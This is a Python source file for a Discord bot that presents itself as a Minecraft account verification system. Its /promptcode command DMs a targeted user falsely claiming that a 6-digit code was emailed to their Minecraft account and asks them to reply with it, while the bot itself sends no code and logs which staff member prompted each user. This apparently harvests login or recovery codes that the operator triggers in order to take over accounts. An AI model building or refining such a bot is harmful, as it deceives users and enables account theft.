import discord
from discord.ext import commands
from discord import app_commands
import asyncio

TOKEN = 'DISCORD_TOKEN'
VERIFICATION_CHANNEL_ID = YOUR_VERIFICATION_CHANNEL_ID  # Replace with your actual channel ID

# Initialize the bot
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Dictionary to store pending verification codes for users
pending_codes = {}

# Define the LinkView for the button interaction
class LinkView(discord.ui.View):
    @discord.ui.button(label="Link Account", style=discord.ButtonStyle.green, custom_id="link_account_button")
    async def link_account(self, interaction: discord.Interaction, button: discord.ui.Button):
        # Handle the button click logic here
        await interaction.response.send_message("You clicked the Link button!")

# Setup command to send embed and start verification
@bot.tree.command(name="setup", description="Start the Minecraft account verification process")
async def setup(interaction: discord.Interaction):
    verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)  # Fetch the verification channel

    # Fetch the last 100 messages from the channel (you can adjust the number if needed)
    messages = await verification_channel.history(limit=100).flatten()

    # Delete previous /setup embed if found
    embed_found = False
    for message in messages:
        if message.embeds:
            for embed in message.embeds:
                if embed.title == "🔗 Link Your Minecraft Account":
                    embed_found = True
                    await message.delete()
                    print(f"Deleted message with embed: {embed.title}")
                    break  # Stop once the embed is deleted

    # If no embed was found to delete, log it
    if not embed_found:
        print("No previous embed with the title '🔗 Link Your Minecraft Account' was found to delete.")

    # Create the new embed
    embed = discord.Embed(
        title="🔗 Link Your Minecraft Account",
        description="Click the **Link** button below to start verification.",
        color=discord.Color.green()
    )
    embed.set_footer(text="This is an automated message.")

    # Send the new embed with the Link button
    await verification_channel.send(embed=embed, view=LinkView())  # No ephemeral flag, visible to everyone

    # Acknowledge the command response
    await interaction.response.send_message("Setup started! Verification channel updated.", ephemeral=True)

# Command to prompt a user to check their DMs for the 6-digit code
@bot.tree.command(name="promptcode", description="Prompt a user to check their DMs for a 6-digit code")
async def promptcode(interaction: discord.Interaction, user: discord.Member):
    try:
        # Send the detailed DM message to the user
        dm_message = (
            "We've sent a 6-digit code to your email address linked to your Minecraft account.\n\n"
            "Please reply to this DM with the code to complete your verification.\n\n"
            "🔒 Your information will remain private.\n"
            "If you have any questions, feel free to ask staff!"
        )
        embed = discord.Embed(
            title="📨 Minecraft Server Verification\n",
            description=dm_message,
            color=discord.Color.blue()
        )
        embed.set_footer(text="This is an automated message.")
        await user.send(embed=embed)
        await interaction.response.send_message(f"{user.mention} was prompted to check their DMs ✅", ephemeral=True)
        pending_codes[user.id] = interaction.user.id
    except discord.Forbidden:
        await interaction.response.send_message(f"❌ Couldn't DM {user.mention}. They might have DMs turned off.", ephemeral=True)

# Event when the bot is ready
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name} (ID: {bot.user.id})')
    print('------')

    # Sync slash commands (register commands to Discord)
    try:
        synced = await bot.tree.sync()
        print(f"Synced {len(synced)} slash commands.")
    except Exception as e:
        print(f"Error syncing commands: {e}")
    
    # Test if the bot has permission to send messages to the verification channel
    try:
        verification_channel = await bot.fetch_channel(VERIFICATION_CHANNEL_ID)
        embed = discord.Embed(
            title="🔗 Link Your Minecraft Account",
            description="Click the **Link** button below to start verification.",
            color=discord.Color.green()
        )
        embed.set_footer(text="This is an automated message.")
        await verification_channel.send(embed=embed, view=LinkView())  # Send the new embed with the Link button
        print("Verification embed sent successfully!")
    except discord.Forbidden:
        print(f"Bot does not have permission to send messages in the verification channel {VERIFICATION_CHANNEL_ID}")
    except Exception as e:
        print(f"Error sending verification embed: {e}")

# Run the bot with the token
bot.run(TOKEN)
